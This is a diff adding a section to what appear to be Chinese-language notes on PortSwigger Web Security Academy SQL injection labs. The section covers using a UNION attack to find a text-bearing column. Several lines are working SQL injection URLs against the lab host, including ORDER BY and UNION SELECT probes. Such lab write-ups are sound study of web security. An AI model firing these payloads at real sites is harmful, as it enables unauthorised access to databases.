@@ -60,3 +60,9 @@
 `https://xxxxxxx.web-security-academy.net/filter?category=Pets%27%20order%20by%203--+`
 
 `https://xxxxxxx.web-security-academy.net/filter?category=Pets%27union+select+null,null,null--+`
+
+## SQL injection UNION attack, finding a column containing text
+
+> 确定回显点为第二列之后，就可以在回显处完成输出`7ix1eZ`。
+
+`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,%277ix1eZ%27,%273%27--+`
